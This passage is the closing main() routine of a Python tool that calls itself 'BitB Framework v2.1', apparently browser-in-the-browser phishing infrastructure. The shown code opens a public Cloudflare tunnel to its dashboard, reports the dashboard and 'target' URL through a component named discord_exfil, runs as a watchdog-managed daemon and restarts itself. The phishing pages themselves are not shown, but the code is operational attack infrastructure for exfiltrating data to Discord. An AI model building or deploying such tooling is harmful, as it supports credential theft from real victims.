        global_tunnel_url = tunnel_manager.start_api_tunnel(CONFIG["listen_port_api"])
        if global_tunnel_url:
            log.info(f"🌐  PUBLIC URL: {global_tunnel_url}")
            if discord_exfil:
                discord_exfil.send_alert(
                    f"🚀 **BitB Framework v2.1 Online**\\nDashboard: {global_tunnel_url}\\nTarget: {CONFIG['target_url']}",
                    level="success"
                )
    
    # ─── Final Info ────────────────────────────────────────────────────────
    log.info("=" * 70)
    log.info(f"  Local:  http://{CONFIG['listen_host']}:{CONFIG['listen_port_api']}")
    if global_tunnel_url:
        log.info(f"  Public: {global_tunnel_url}")
    log.info(f"  Access: {'🛡️  IP Restricted' if CONFIG['access_control_enabled'] else '🌍 Open'}")
    log.info("  Ctrl+C to stop")
    log.info("=" * 70)
    
    # Notify systemd we're ready
    daemon_manager.systemd_ready()
    
    # ─── Main Loop ────────────────────────────────────────────────────────
    try:
        if CONFIG["daemon_enabled"]:
            watchdog_thread = threading.Thread(target=_watchdog_loop, daemon=True)
            watchdog_thread.start()
        
        while not daemon_manager.is_shutdown_requested():
            time.sleep(1)
            
    except KeyboardInterrupt:
        log.info("🛑 Keyboard interrupt received")
    finally:
        log.info("🛑 Shutting down BitB...")
        if CONFIG["cloudflare_tunnel_enabled"] and tunnel_manager:
            tunnel_manager.stop_all_tunnels()
        if ip_access_controller:
            ip_access_controller.cleanup()
        server.shutdown()
        daemon_manager.remove_pid_file()
        
        if daemon_manager.should_restart():
            log.info("🔄 Restart flag detected — restarting...")
            daemon_manager.clear_restart_flag()
            os.execv(sys.executable, [sys.executable, __file__] + 
                    (["--daemon"] if CONFIG["daemon_enabled"] else []) + sys.argv[1:])
        
        log.info("👋 Goodbye!")


if __name__ == "__main__":
    main()
